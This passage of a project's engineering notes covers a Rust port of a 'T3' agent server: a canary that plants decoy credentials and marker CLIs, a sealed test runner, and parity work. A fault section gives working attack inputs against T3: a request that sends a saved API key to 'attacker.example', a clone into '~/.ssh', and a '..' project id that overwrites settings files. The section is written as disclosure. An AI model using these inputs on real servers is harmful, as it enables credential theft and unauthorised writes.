- `thread_shell` showed `running` where T3 shows `queued` behind a running turn
  (`conn-engine/src/shell.rs`, after T3's `latestUnheldRun`);
- a SIGTERM stored a running Codex turn as interrupted, where T3 continues it on the next
  start. That was a wrong "idle" after a restart (`conn-engine/src/runner.rs`, `pump`).

**Closed on 2026-11-15:** after a Codex subagent ends, T3 wakes the agent with a new turn;
`conn-provider-codex` now does too (see "Codex: the abandoned start and the status probe",
part 3), and the check's `KNOWN` list is empty: 23 comparisons, all the same. **Reported, not counted:** a missing
protocol header answers 400 with JSON here and with an empty body in T3; Orbit always sends
`2`. Not proven: Claude and Grok through these states, a message typed by a person,
`blockedOnThreadWait`, a non-blocking question, archived threads, and a crash (SIGKILL).

## The canary: no check reads the home or the shell's secrets (2026-11-14)

`tools/canary.mjs` holds the rule in `AGENTS.md` ("never read provider, `gh` or `git`
settings or credentials in a check"). `tools/check.sh` sets it up before the first check, so
every check runs with:

- a decoy HOME: marker files where `~/.claude/settings.json`, `~/.claude.json`,
  `~/.codex/config.toml`, `~/.grok/settings.json`, `~/.config/gh/config.yml`, `~/.t3/…/settings.json`,
  the shell profiles and `~/.gitconfig` would be (readable, access time set to 2000), and
  credential stand-ins (`.claude/.credentials.json`, `.codex/auth.json`,
  `.grok/user-settings.json`, `.config/gh/hosts.yml`, glab, `.netrc`, `.t3/…/secrets`) at mode
  000. The `.gitconfig` carries a marker identity and a credential helper that is a tripwire;
- marker values in `ANTHROPIC_API_KEY`, `ANTHROPIC_BASE_URL`, `ANTHROPIC_AUTH_TOKEN`,
  `CLAUDE_CODE_OAUTH_TOKEN`, `OPENAI_API_KEY`, `CODEX_HOME`, `XAI_API_KEY`, `GH_TOKEN`,
  `GITHUB_TOKEN`, `GITLAB_TOKEN`, `T3CODE_HOME` and `CONN_CANARY`;
- a stand-in `SHELL` (runs the `-c` script with `/bin/sh`, reads no profile, keeps no history),
  and a `TMPDIR` inside the canary's folder, which a watcher scans every 0.5 s.
- **real CLIs:** marker executables named `claude`, `codex`, `grok`, `gh`, `glab`, `fj`, `tea`,
  `az` and `cafe` first on `PATH`; each run is logged and fails;
- **outside network:** every Node process loads a hook (`NODE_OPTIONS=--import`) that refuses
  and logs a socket or DNS lookup outside loopback (`fetch`, `http`, `https`, `tls`, `net`);
  our server refuses and logs one when `CONN_NETWORK_LOG` is set (`conn_source_control::http`,
  the one place it dials outside; unset in use). This works without root on macOS and Linux,
  unlike `sandbox-exec`. Cargo and cargo-deny reach crates.io and the RustSec database on
  purpose and are not covered; nor is any other program (git, a CLI a tool puts on its own
  `PATH`) that opens a socket itself;
- after each check, `mark` names that check beside every read, CLI run and outside call.

The last check (`canary`) first runs a self-test (each kind of breach, a marker CLI run and an
outside `fetch` and socket from Node must fail `verify`, a loopback socket must not, and each
lint rule must fire on a sample), then fails when: a marker CLI ran; a Node process or our
server tried a host outside loopback; a readable decoy file's access time
moved; the decoy home differs from its listing (type, mode, size, SHA-256); the tripwire ran;
a marker appears in any check's output or in a file under TMPDIR or the check's scratch folder;
or the lint finds `os.userInfo().homedir`, `getpwuid`, a `home_dir` lookup, `env -i` without
`HOME=`, or `HOME: os.homedir()` passed on (a line marked `canary: allow` is exempt: the live
recorder and `parity.mjs --model`).

**What it cannot see:** a `stat` or an existence check of a decoy path; an open of a mode-000
file whose error is swallowed and not printed (a readable sibling in the same tool's folder,
such as `config.toml` next to `auth.json`, is what usually reveals the tool); a marker in a file
that lived less than 0.5 s; writes outside TMPDIR, the scratch folder and the decoy home; a read
on a `noatime` file system (the setup's self-test then fails the run rather than pass it); a
passwd lookup in a program we do not own (T3's `hydratePosixHome`, `os-jank.ts:99-108`, uses
`os.userInfo().homedir` only when `HOME` is empty; every sealed environment sets `HOME`).

**How each check finds a home, and what it caught** (first run: 36 checks green, canary 1,875
findings; after the marker CLIs and the network hook: 385 more; now 0 with 40 checks):

| Check | How it finds a home | Sealed before | Found and done |
| --- | --- | --- | --- |
| fmt, clippy, release build, cargo deny | cargo: `CARGO_HOME`, and `~/.gitconfig` through `HOME` (its own proxy lookup) | no | read `~/.gitconfig`; check.sh now runs cargo with `GIT_CONFIG_GLOBAL=/dev/null` |
| cargo test, decode check | the code under test: `HOME` (`std::env::var_os`), `$SHELL`; `git` reads `~/.gitconfig` | no | `interrupt_tests` opened `ClaudeConfig::default()` and read the real `~/.claude/settings.json` on every run (now a home that does not exist); git tests in `conn-vcs`, `conn-files`, `conn-engine`, `conn-server` read the git config (cargo sealed as above); `conn-terminal` tests started an interactive `/bin/sh` that wrote `~/.bash_history` (now `HISTFILE=/dev/null`); the decode check ran cargo past the seal |
| gen-contract, gen-tools, gen-keybindings, gen-upstream, gen-graphql, check-copies, limits-diff, instructions checks | in-process T3 code (`os.homedir()` → `HOME`); `git rev-parse` in `monorepo.mjs` | no | every run read `~/.gitconfig`; `gitEnv()` |
| effect-client, replay | our server: `sealedEnv` (a denylist that let `OPENAI_API_KEY`, `CODEX_HOME`, `T3CODE_HOME` through); `git` with the shell's environment | partly | `sealedEnv` is now an allowlist with a stand-in shell; `gitEnv()` |
| client-check | `cargo run` of `export_turn` (fake provider) | no (check.sh's decoy only) | nothing read |
| settings-diff, served (decode coverage) | our server with the whole environment, the real `HOME` | no | `sealedEnv` |
| secrets-interop, textgen-diff, registry-diff, webhook-diff | our server or examples, inherited environment | no | `sealedEnv` / `sealedEnvTemp` |
| parity | T3 server: `HOME: os.homedir()` (real), `~/.local/bin` and Homebrew on `PATH`, so its provider probes could run this machine's `claude` and `codex` with their logins; our server: the whole environment | no | without `--model`: a throwaway HOME, `/usr/bin:/bin` beside node; our server `sealedEnv` |
| codex conformance | `vp` (T3) and `cargo run` (ours) with the whole environment | no | the stub recorded every token variable and HOME into `env.json` and `stub.ndjson` (80 files); `sealedNodeEnv` / `sealedCargoEnv` |
| acp conformance, grok probe conformance | the same | no | the same leak (34 and 22 stub logs, the parent-env files); sealed the same way |
| claude catalog, claude conformance, claude t3-replay | `env -i` with a throwaway `HOME` | yes | cargo builds read `~/.gitconfig`; sealed |
| claude probe conformance, t3 fixture replay | `sealedNodeEnv`, a known base environment | yes | cargo build read `~/.gitconfig`; `gitEnv()` |
| orbit-flow (fake provider) | our server with the whole environment | no | `sealedEnv` without a model; the live Haiku run keeps the shell's environment |
| replay, effect-client (found once the marker CLIs were in) | our server's source control discovery runs each host CLI found on `PATH` | HOME sealed, `PATH` not | the server ran `gh --version`, `gh auth status --json hosts`, `gh auth token --hostname github.com`, `glab`, `az account show`, `fj`, `tea`, `cafe`: the real ones from Homebrew, with the sealed HOME (no login found). `sealedEnv` now gives a `PATH` without provider, host and VCS CLIs (`sealedPath`: a folder holding one becomes links to the rest) |
| cargo test (marker CLIs, network) | `StubDir::path_env` puts the inherited `PATH` after the stubs | no | `github_reads_and_creates_repositories_over_rest` ran this machine's `gh auth token` (now a stub); the link-local tests stay refused before any dial |
| thread-cli-diff, model-manifest-diff (from `main`) | own sealed env; git and the example inherited | partly | git read `~/.gitconfig`; sealed |
| parity, again | T3 server `PATH` | done above | it now fails when a provider or host CLI is on that `PATH` without `--model` |
| Not in check.sh: capture-ts-events (Codex, ACP), memory-flow, test-contract-change, bump-report, churn | the same patterns | no | sealed the same way; `fixtures/recorder/record.mjs` keeps the real HOME (live turns, marked `canary: allow`) |

Cargo reads `~/.gitconfig` through `HOME` and ignores `GIT_CONFIG_GLOBAL`, so `check.sh` runs
cargo with a throwaway HOME and a target runner hands the decoy HOME back to the test and
example binaries. The `ignore` crate behind `conn-files`' walk parsed `~/.gitconfig` itself
in every listing and search; the walk now skips it when `GIT_CONFIG_GLOBAL` is set, as git
does (`conn-files/src/entries.rs`).

Our Rust code finds a home only through `HOME` (`home.rs`, the providers' `expand_home`,
`conn-files`, `conn-terminal`); it has no passwd lookup, and the lint keeps it so. Children
started with `env_clear()` (`conn-provider-support::probe`, the ACP probe, the terminal) get an
environment built from the server's, which holds `HOME`.

Hand runs (`cargo test`, `cargo run` typed in a shell) are sealed by the cargo runner since
2026-11-15; see the next section.

## Hand runs are sealed: the cargo runner (2026-11-15)

On 2026-11-15 a hand run of `cargo test -p conn-provider-codex` started this machine's real
`codex app-server` with the real home. A rule that holds only by care had failed three times in
two days. Now the workspace seals every binary that cargo starts:

- `.cargo/config.toml` sets `[target.'cfg(all())'] runner = "tools/cargo-runner"` (a POSIX
  shell script that runs `tools/cargo-runner.mjs` with `node`). Node, not shell or Rust: the
  runner imports the lists of `tools/sealed-env.mjs` itself (`sealedRunEnv`), so the runner and
  the tools cannot drift, and nothing has to be built before the tests.
- The binary gets a fresh HOME, a stand-in `SHELL`, `RUNTIME_VARIABLES` and what cargo and
  libtest set (`CARGO_PKG_*`, `CARGO_MANIFEST_DIR`, `RUST_*`, ...), our test knobs
  (`RUN_KNOBS`), a `PATH` without provider, host and VCS CLIs (`sealedPath`; `git`, `node`,
  `sh` stay), `GIT_CONFIG_GLOBAL`/`GIT_CONFIG_SYSTEM=/dev/null`, the Claude and Codex status
  probes off, `CONN_MODEL_MANIFEST_URL=off`, and `CONN_NETWORK_LOG` (our HTTP client refuses
  hosts outside loopback; the runner fails the run and names them).
- The temp folder (`$TMPDIR/conn-run-<pid>-*`) is removed when the binary ends, also on
  SIGINT, SIGTERM, SIGHUP or SIGQUIT (forwarded to the binary). After a SIGKILL of the runner,
  the next run removes it.
- **The way out:** `CONN_UNSEALED=1`, for the live tests (`--ignored`), the recorder with a live
  model, and the server by hand with a real login. The runner prints
  `cargo-runner: WARNING: CONN_UNSEALED=1: ...` and passes the shell's environment on. Any
  other value is refused. `tools/check.sh` and the CI test step fail when it is set.
- **The canary's runner wins.** `CARGO_TARGET_<HOST>_RUNNER` in the environment is preferred to
  the config file's `cfg` runner; `tools/check.sh` sets it, so `cargo test` in a check still
  sees the decoy HOME and the markers. Tools that run cargo themselves drop it
  (`sealedCargoEnv`) and get the sealed runner.
- **Second line:** `conn_support::spawn_guard::check` runs before each spawn that can start
  `claude`, `codex`, `grok` or a host CLI (`conn-provider-support` process and probe,
  the ACP probe, Codex text generation, `conn-vcs` process and discovery). In a test binary
  (in a `deps` folder) of a debug build, it aborts with a message when the program resolves
  outside the temp folder or the workspace. In a release build it is an empty inline
  function; a debug server run by hand is not a test binary, so it is not affected.
- **Proof:** the `sealed-run` check (`tools/sealed-run-check.mjs`, in `tools/check.sh` and
  CI). Plain `cargo test -p conn-support --lib sealed_environment_report` with a decoy HOME, 8
  marker variables, a decoy `SHELL` and 14 marker CLIs first on the outer `PATH`: the test
  sees another HOME (gone after), no marker, no marker CLI on `PATH`, `GIT_CONFIG_GLOBAL=/dev/null`,
  the network gate on, and `codex` not found; no marker CLI ran. With `CONN_UNSEALED=1` the
  warning shows and the decoy reaches the test; `CONN_UNSEALED=yes` is refused; an
  environment runner wins over the config. It also fails when `HOST_CLIS` in
  `sealed-env.mjs` and `spawn_guard.rs` differ, or when our Rust code reads a variable that
  the runner neither passes, sets nor drops on purpose (`RUN_DROPPED`). Without
  `.cargo/config.toml` the check fails on 19 counts.
- **The planted case:** `a_missing_binary_is_listed_with_an_error` as it was before its fix
  (an instance that falls back to `codex` on `PATH`), with a recording `codex` first on the
  outer `PATH`: under the runner the marker ran 0 times (the test fails: codex not found).
  With `CONN_UNSEALED=1` the spawn guard aborted the test binary before the spawn
  (`spawn guard: a test would start \`codex\` (...)`), the marker again ran 0 times.
- **Counts:** `cargo test --workspace` by hand: 931 passed, 13 ignored before; 933 passed, 13
  ignored after (the two new tests). The Claude and SDK host tests ran: no `skipped:` line
  with `--nocapture`.
- **Cost:** about 30 to 35 ms per test binary (once per binary, not per test), about 70 ms when
  the shell's `PATH` has a large folder with a host CLI in it (the link folder); about 1 to 3 s
  for the workspace's 40 test binaries.

**What it cannot stop:** cargo itself (it reads `~/.gitconfig` through `HOME`, `~/.cargo`,
and reaches crates.io; build scripts and proc macros run in cargo's environment); a binary run
directly (`target/debug/conn-server`); a tool run with `node` by hand outside `tools/check.sh`
(the tools seal their own children, but the tool process keeps the shell's environment); a
connection that does not go through `conn_source_control::http` (the runner has no socket
hook for Rust; Node processes get none outside the canary); a read of an absolute path that
does not come from `HOME`; doc tests (the workspace has none; that rustdoc honours the runner
is not checked). The runner needs `node` on `PATH`; without it no binary runs, never unsealed.
## Stop during a turn start, as the T3 server does it (2026-11-14)

A Stop that arrives before the provider accepted the turn now ends the run at once, for every
provider, as T3's `dispatchRunInterrupt` "before provider start" (`Orchestrator.ts`
13013-13161). Before, Stop queued `Interrupt` behind the running `StartTurn` in the thread's
lane, and a Claude cold start showed "Stopping" for up to about 6.5 minutes.

- **Keyed on acceptance.** The store keeps an in-memory start ledger beside SQLite: a run is
  *accepted* once `Session::start_turn` returned for it (T3 keys on the stored provider turn;
  our Claude shows its turn before the boot, so a row is no proof). A restart starts every
  active run again, so nothing persists and a store written by `main` loads unchanged. Bound:
  one entry per active run, pruned at 1,024.
- **What the client sees, as T3.** In the Stop's own commit: the `run_interrupt_request`
  ("Stopped by user", or the reason), the `run_interrupt_result` ("Run interrupted before
  provider start", parent the request, ordinal + 1), then the attempt, the root node and the
  run `interrupted`. No checkpoint capture and no provider-thread write, as T3. `thread.stop`
  holds the queue; a send releases it and starts cleanly. A second Stop changes nothing. Force
  stop dispatches `run.interrupt` with "Force stopped by user" (T3's `forceStopThread`), then
  releases the session. A restart send and a stopped delegated child take the same branch.
- **What the provider sees.** `Effect::AbandonStart` runs at once, outside the lane, and calls
  the new `Session::abandon_turn_start`. A start that had not reached the provider never does.
  A turn the provider accepts anyway is interrupted (T3 interrupts a provider turn that starts
  after Stop, `RunExecutionService` `shouldStartProviderTurn`). The lane still orders the next
  start, a model change or a rollback behind the abandoned start, as T3's worker waits for the
  interrupted start to end.
  - **Claude:** attachments are read before the query opens (as T3's `startTurn`); a Stop then,
    or while `resolveSettings` waits for the SDK host, opens nothing. A Stop while the CLI boots
    (`initializationResult`) or registers MCP servers aborts the query with the new host
    command `abort`: T3's teardown of an interrupted `openQuery` (`ClaudeAdapterV2.ts`
    1530-1550: prompt stream ended, SIGKILL of the wrapper, whose exit kills the CLI's group,
    up to 10 s for the exit, dispose). The early turn ends `interrupted`.
  - **Codex:** the start stops at the request it waits on (`thread/resume`, `config/read`,
    `turn/start`) and sends nothing more, as T3's interrupted `startTurn`. Since 2026-11-15 a
    turn that a written `turn/start` still started gets `turn/interrupt` (Nick's decision; see
    "Codex: the abandoned start and the status probe").
  - **ACP (Grok):** the start finishes the step it is in (an agent restart is not cut short,
    so no half-started process is left) and sends no `session/prompt`.
- **Proofs.** Engine tests (fake provider: `coldstart` shows its turn and takes 500 ms,
  `latestart` cannot abandon): `stop_during_a_slow_start_ends_the_run_at_once` (events and
  their order, the provider told before its start ended, no interrupt, the queue held, a second
  Stop, the next send), `stop_before_the_start_runs_never_starts_the_provider`,
  `a_turn_accepted_after_stop_is_interrupted` (the race the other way),
  `stop_after_the_start_was_accepted_interrupts_the_provider`,
  `force_stop_during_a_slow_start_ends_the_run_before_provider_start`,
  `work_queued_behind_an_abandoned_start_runs_after_it` (a model change and a restart send).
  Six fail with the old path. Claude: `an_abandoned_start_aborts_the_booting_query`;
  conformance scenarios `stop_during_boot` and `stop_during_mcp_registration` (the stub holds
  `initialize` or `mcp_set_servers`; the T3 side interrupts `startTurn` as its worker does): SAME,
  2 CLI starts, the first killed with no prompt; with `close` in place of `abort` the scenario
  reports DIFF. The stub now records how each start ended, and `compare.mjs` compares it.
  Codex: `an_abandoned_start_sends_nothing_more` (a fake app-server holds `config/read`, then
  `turn/start`; replaced on 2026-11-15 by the six tests named in "Codex: the abandoned start
  and the status probe"). ACP: `an_abandoned_start_sends_no_prompt`. `client-check.mjs`: the client's
  reducers show the run interrupted at once and never "Stopping".
- **Checks** (macOS, 2026-11-14): `tools/check.sh` 36 of 36, none skipped; Claude conformance
  18 of 18 SAME in 5 runs in a row; Codex conformance 0 open differences in 40 scenarios; ACP
  17 of 17; T3 transcript replay 18 of 18; fixture replay 69 of 159, unchanged (Claude 34,
  Codex 25, Grok 10). Memory (`memory_load 1000 1`, release, 3 runs each): live heap at turn
  1,000 457-466 KiB on `main`, 458-467 KiB here; after close 388 and 389 KiB.
- **Not proven.** Codex and ACP have no T3-side comparison of a mid-start Stop (their
  conformance harnesses drive T3's fixture runner; a held response plus a Stop there is not
  built). A Stop during our SDK host's own launch has no T3 counterpart (T3 has no host); ours
  opens nothing then. A Stop while the engine opens the provider session or loads the native
  thread lets that step finish (T3 interrupts it), then sends no turn. Our first run of a new
  thread has no provider thread while `starting`, so a Stop then writes no request or result
  item (T3 has one); after the running write it does.

## `t3_background_wait` (2026-11-14)

`/mcp` serves it as T3's `toolkits/orchestrator` does (`tools.ts:143`, `handlers.ts:64`):
a live thread caller only (`actsAsCaller`), `taskIds` 1 to 20 trimmed non-blank strings,
`waiting` (default true), result `{matched, unmatched}`. `Engine::await_background_tasks` is
`ThreadManagementService.awaitBackgroundTasks` (1532-1576): the thread's active provider
thread and its live session, 15 s for the provider, reasons `unavailable` and `failed`
(`orchestration_error`), `unsupported` (Codex, Grok) and `unmatched` (`invalid_request`),
with T3's texts. Claude marks the tasks on its roster; the engine stores nothing. Proof:
`gen-tools.mjs --check`; `parity.mjs` 10 more calls against the T3 server, values compared
(the access refusal and every argument error; the success path needs a running provider task
and is proven by the engine test `marks_and_clears_awaited_tasks_on_the_live_session` on the fake provider). Named in our
instruction texts and still unserved (13): `create_threads`, `device_list`, `device_open`,
`device_screenshot`, `html_preview`, `html_render`, `preview_open`, `preview_status` (and the
other `preview_*`), `request_secret`, `t3_environment_link`, `t3_environment_links`,
`watch_pull_request`, `unwatch_pull_request`.

## Codex: the abandoned start and the status probe (2026-11-15)

**A Stop that abandons a start stops a turn that still reached Codex** (Nick, 2026-11-15:
"interrupt it"). Before, a Stop while `turn/start` waited for its answer dropped the answer, as
T3 does; a turn Codex had started ran on unobserved, and its later `turn/started` was taken
for a subagent's. Now the answer goes to a watcher: when it, or a `turn/started`, names the
turn, Codex gets one `turn/interrupt` for it; none of its frames become events; the next start
on the thread waits (at most 60 s plus 10 s) until that turn ended. A Stop before
`turn/start` was written still sends nothing. Bound: one abandoned start per session; the
watcher ends with the answer or its 60 s limit. Tests, on a fake app-server (in
`crates/conn-provider-codex/src/live_tests.rs`, no CLI, not ignored):
`an_abandoned_start_before_turn_start_sends_nothing_more`,
`a_late_answer_to_an_abandoned_start_interrupts_its_turn` (the answer comes late),
`a_turn_started_for_an_abandoned_start_is_interrupted` (only `turn/started` comes),
`an_abandoned_start_that_never_answers_sends_nothing_and_ends` (nothing comes; the limit
shortened to 300 ms), `the_next_turn_waits_for_an_abandoned_start_that_reached_codex` (the
next turn is sent before the late answer), `closing_the_session_ends_an_abandoned_start`. Four
of them fail with the tracking switched off. Codex conformance: 0 open differences in 43
scenarios (the normal paths did not change). A deliberate difference from the T3 server, in
the crate README and below under "Faults found in the T3 server".

**The Codex status probe, as T3 runs it.** `crates/conn-provider-codex/src/status.rs` ports
`checkCodexProviderStatus` (`apps/server/src/provider/CodexProvider.ts`): for each Codex
instance its own `codex app-server` (its binary, launch arguments, home and environment, plus
`MISE_OFFLINE=1`) in the server's folder; `initialize`, `account/read`, then `skills/list`,
`model/list` (every page; for ChatGPT again after Codex's cache refresh) and `config/read`
together, and `account/rateLimits/read` when the config routes to OpenAI; 20 s in all; on a
failure `codex --version`. The entry has T3's texts for each case, the account status (never
a token; no credential file is read), the models with their options, `customModels`, the
catalog from T3's bundled manifest (`gen-model-catalog.mjs`, checked), the skills and the slash
commands. The README's "Status probe" lists every request, limit and failure.

- **When:** at start, on a settings change, on `server.refreshProviders`, and every 5 minutes
  only while a foreground client asks (the existing loop in `methods/provider.rs`). An idle
  container starts no Codex process after the start; the probe's process ends with it.
- **Listing:** an enabled Codex instance whose binary is missing is now listed, with T3's
  error entry ("Could not start Codex CLI …"); before, it was left out.
- **Checks** set `CONN_CODEX_STATUS_PROBE=off` (in `sealed-env.mjs` and every flow that starts
  a server), so no check runs this machine's `codex`; the entry then stays T3's pending one.
  `instances-flow.mjs` and `effect-client.mjs` turn it on with stubs only.
- **Proof:** `crates/conn-provider-codex/tools/probe-conformance/run.mjs` (in `tools/check.sh`):
  T3's own `checkCodexProviderStatus`, with `CodexDriver`'s settings, environment, home layout,
  catalog and identity, and ours, against a stub `codex` in 16 scenarios (disabled, missing
  binary by path and by name, a hang, a failed `initialize`, signed out with and
  without a home, ChatGPT with and without the cache refresh, an API key with custom models,
  Orbit's router, a failed `skills/list`, a model list that never answers, a failed usage read,
  instance settings with a `~` binary and launch arguments from the environment): 16 of 16
  SAME, entry and every run (argv, environment, folder, stdin lines with the concurrent reads
grouped by method, and signals). A first full run showed two timing races, both fixed: our
concurrent reads now poll in T3's order (`biased`), so a failed `skills/list` ends the model
list as in T3; and whether the stub sees end of input before SIGTERM is timing on both sides,
so it is not compared. Then 3 runs in a row and 2 at once: all SAME.
  Sealed: T3's side in `sealedNodeEnv` with the fetch guard; both sides probe with
  `PATH=/usr/bin:/bin` (checked to hold no provider CLI). `instances-flow.mjs`: its Codex
  instance has a probed `ready` entry, the probe ran with the instance's environment and home,
  and no probe process is left. `effect-client.mjs`: the real client decodes a probed entry
  and a missing-binary error entry. `check-copies.mjs`: the plan and effort labels and the
  preferred default models.
- **Cost** (macOS, release, stub CLI): about 40 ms per probe; server RSS 11.7 MiB after it
  against 11.4 MiB with it off; no child process left. With the real CLI: its own start, up
  to 3 s more for a ChatGPT account's catalog refresh, one `codex app-server` for that time
  (not measured: no check runs the real CLI).
- **Not ported, on purpose:** the version advisory, the managed setup mode and shadow homes,
  the `auth.json` watch (the next probe shows a sign-in done outside). Known differences:
  T3's client fails the probe on an answer that does not fit Codex's schema, ours tolerates
  it; our stderr tail is 4 KiB, T3's 8 KiB.
- **Checks** (macOS, 2026-11-15, after the merge of `main` and part 3): `tools/check.sh` 43
  of 43, none skipped, the canary clean; Codex conformance 0 open differences in 45 scenarios;
  fixture replay 69 of 159 (Codex 25 of 25, Claude 34 of 34, Grok 10 of 15); `idle-diff` 23
  of 23 the same. **A breach while building this:** the first run of the unit test
  `a_missing_binary_is_listed_with_an_error` (by hand, with the shell's environment, before the
  sealed rule was applied to hand runs) probed this machine's real `codex` once: the test gave
  the missing path in the base config, and `with_instance(None)` set the binary back to
  `codex` on PATH. One `codex app-server` ran with the real home and answered the probe's
  reads (`initialize`, `account/read`, skills, models, config, maybe the usage read through the
  CLI); no model call, nothing written by us. The test now gives the path through the instance
  entry, and hand runs use the sealed environment.
- **Shared files changed:** `tools/sealed-env.mjs` (the Codex probe off), `tools/served.mjs`,
  `tools/check.sh`, `tools/check-copies.mjs`, `tools/upkeep/followed-files.txt`, and in
  `crates/conn-server/tools`: `effect-client.mjs`, `instances-flow.mjs`, `orbit-flow.mjs`,
  `memory-flow.mjs`, `settings-diff.mjs`, `secrets-interop.mjs`, `thread-cli-diff.mjs`. Not
  changed: `crates/conn-provider-codex/tools/conformance.mjs`.

### Part 3: the Codex wakes (2026-11-15)

`idle-diff` showed one state where Orbit would read idle while T3 reads active: a Codex
subagent that ends after its root turn. T3's `CodexAdapterV2` asks for a continuation turn
then, and for a background command that ends after its completed turn. Both are built, on the
engine's existing path (`ProviderEvent::ContinuationRequested`, the queued agent message);
nothing new in the engine but `ContinuationRequest.delivery`: T3's `message_text` wakes are
the server's messages (`creationSource: "server"`), Claude's stay the provider's. The rules,
texts and limits are in `crates/conn-provider-codex/README.md`, "Wakes". The notice builder
(`backgroundWorkNotification`, now with exit codes) moved to
`conn_provider_support::notification`; Claude uses it unchanged.

- **Proof:** `idle-diff`: the state "the background work ended (T3 wakes the agent)" is the
  same, and so is "after the wake turn"; its `KNOWN` entry is gone (23 of 23 the same). Codex
  conformance: two new scenarios, `subagentWake` and `commandWake`, run T3's adapter with its
  continuation worker on recordings with the child or the command moved behind the root
  turn's end, plus a wake turn: T3's offers and our events are equal (text, notice,
  delivery), and Codex gets the same wake `turn/start` from both; with our wake switched off
  `subagentWake` reports the missing wake. The replay compares `completionWake` now (21 of
  21). Unit tests in `replay_tests.rs` (the command wake once, none after a Stop, `thread/closed`,
  the subagent rules) and the engine's `a_message_text_wake_is_the_servers_message`.
- **What Codex receives on a wake:** an ordinary `turn/start` whose text is the wake's detail
  (`Subagent completed: …`, `Background command completed …`), as from T3.
- **Bounds:** at most 16 settled turns, each until its commands end; one offered id per
  command of a settled turn.
- **Not built:** capacity continuations (a turn held for a usage limit), so a wake never waits
  for one; T3's `ThreadManagementProviderInstanceDisabledError` log when the instance is off
  (our dispatch refuses the message the same way, with a log line).

## Faults found in the T3 server

Faults that the T3 server has and this server fixes on purpose. Each is to be written up for
T3 Code.

- **The redaction marker sends the saved text generator key to the caller's host.**
  `apps/server/src/textGeneration/TextGenerators.ts:133-138`: when
  `server.listTextGeneratorModels` gets a `config` whose `apiKey` is the marker, the saved key
  replaces it, whatever `baseUrl` the config names. The method needs only `settings:write`
  (`packages/contracts/src/clientRpcPermissions.ts:37`); changing text generators needs
  `providers:manage`. Input: a client paired with `settings:write` alone sends
  `{"id":"<saved id>","config":{"kind":"openaiCompatible","baseUrl":"https://attacker.example/v1","apiKey":"••••••"}}`.
  Effect: the server sends `Authorization: Bearer <saved key>` (or `x-api-key` for Anthropic)
  to that host, silently; `test: true` also sends a POST. T3's own test
  (`TextGenerators.test.ts:165-188`) expects the key at a new host. Our fix: the handler fills
  the saved key in only when the caller also holds `providers:manage`; otherwise it sends no
  key (`crates/conn-server/src/methods/text_generation.rs`). The owner's edit form keeps
  working, also after a changed host.
- **A clone writes to any path with `source-control:write` alone.**
  `apps/server/src/sourceControl/SourceControlRepositoryService.ts:241-286`
  (`normalizeDestinationPath`, `prepareDestination`) accept any absolute or `~` path, create
  the missing parents, and clone into a missing or empty folder. The method needs only
  `source-control:write` (`clientRpcPermissions.ts:53`). Input: `sourceControl.cloneRepository`
  with a repository the caller controls and `destinationPath: "~/.ssh"` on a host without
  `~/.ssh`. Effect: a folder of the caller's content (such as `authorized_keys`) at that path, a
  filesystem write outside the scope (traced in the code, not run). Our fix: the method needs
  `source-control:write` and `filesystem:write` (`STRICTER` in
  `crates/conn-server/src/scopes.rs`).
- **A project id of `..` puts the annotation folder at the state folder.** In
  `apps/server/src/annotations/AnnotationStore.ts:141`, `directoryFor` keeps dots, so
  `annotations/..` is the state folder, and `ProjectId` takes any non-empty text. Input: a client
  with `orchestration:operate` and `preview:operate` creates a project with id `..`, then calls
  `annotations.create` with id `settings`. Effect in the T3 server: `<userdata>/settings.json`
  is replaced by the annotation JSON, and `annotations.remove` deletes it; the same holds for
  `keybindings.json` and any other `<id>.json` or `<id>.png|jpg|webp` there. Auth lives in
  `statev2.sqlite`, which no annotation name reaches. Here the same call could also replace or
  delete `auth.json`. Our fix: a folder name made only of dots is escaped (each `.` becomes
  `%2E`), the folder must be one child of the annotations root, the per-project lock is keyed
  by the folder name, and `project.create` refuses `.` and `..`.
- **A rollback retry rolls a Codex thread back again.** (Paths in this entry are under
  `apps/server/src/orchestration-v2/`.) `CheckpointRollbackService.ts`
  `execute` (lines 335-346) calls `session.rollbackThread` first, then
  `checkpoints.restore` and `checkpoints.deleteStaleRefs`, and only then writes the result.
  When the restore or the ref delete fails (for example, `.git/index.lock` is held), the
  effect fails and `EffectWorker.ts` (lines 842-886) runs the whole effect again, up to 5
  attempts. Each attempt reads the same durable rows, and `CodexAdapterV2.ts`
  `rollbackThread` (line 8526, with `resolveCodexRollbackTurnCount` at line 1102) counts the
  turns to revert from those rows. Each attempt therefore asks Codex to revert the same number
  of turns on a native thread that is already shorter. Example: three turns, roll back to turn
  1, the index is locked. Codex is asked five times to drop 2 turns, so turn 1 and then the
  whole conversation are dropped. The app still shows turn 1 and the later runs as completed
  and records `rollbackFailure`. The next turn continues a Codex conversation that no longer
  holds what the user sees. The Claude adapter's rollback only builds a row, so Claude is not
  hurt. A crash after the provider rollback has the same effect once: `EffectOutbox.ts`
  requeues `provider-thread.rollback` after a process loss
  (`REPLAY_SAFE_EFFECT_TYPES_AFTER_PROCESS_LOSS`, line 135), and the effect starts again from
  the provider rollback.
- **A Stop during a Codex turn start leaves a turn running unobserved.** In
  `apps/server/src/orchestration-v2/Adapters/CodexAdapterV2.ts`, `startTurn` sends
  `turn/start` (line 7388) and waits for its answer. When the run's worker interrupts that wait
  (a Stop before the provider accepted the turn), the `Effect.ensuring` at lines 7412-7422 drops
  the pending turn and nothing more is sent: no `turn/interrupt`. If Codex received the
  request, it starts the turn. Its `turn/started` finds no pending root turn (lines 4977-4990)
  and goes to `rememberSubagentTurnStarted` (line 5046), so it is kept as a subagent turn that
  no subagent claims. Sequence: send a message; press Stop while `turn/start` waits; Codex
  answers or sends `turn/started`. Effect: Codex works on, and can keep editing files, while
  the client shows the run stopped; the turn's output is never shown. Our fix
  (`crates/conn-provider-codex/src/session.rs`, `mapper.rs`): the answer goes to a watcher;
  when it or a `turn/started` names the turn, it gets `turn/interrupt`; its frames are dropped;
  the next start waits until it ended (bounded).


## What is left, in the planned order

1. **Rust hygiene, step 1: done (2026-11-14).** The toolchain is pinned to 1.99.1; BeautifulRust's
   stage-1 lints and `large_futures` are on, and the workspace is clean under clippy with
   `--all-features`. Also done: typed contract errors in `conn-vcs` and `conn-server`; start-up
   errors exit with status 1; one lock helper per crate; `thiserror` on eight boundary error
   types; `crates/conn-support` for the shared time, hex, base64, HMAC, atomic-write and v4-id
   helpers (`uuid` crate); `rustix` for the liveness check; the store's sequence counter, a
   `Drop` on `CodexSession`, and the find offset in `reads.rs`, each with a test. Next stages
   (bool parameters, `clone_on_ref_ptr`, print lints with `tracing`, pedantic; then the cast
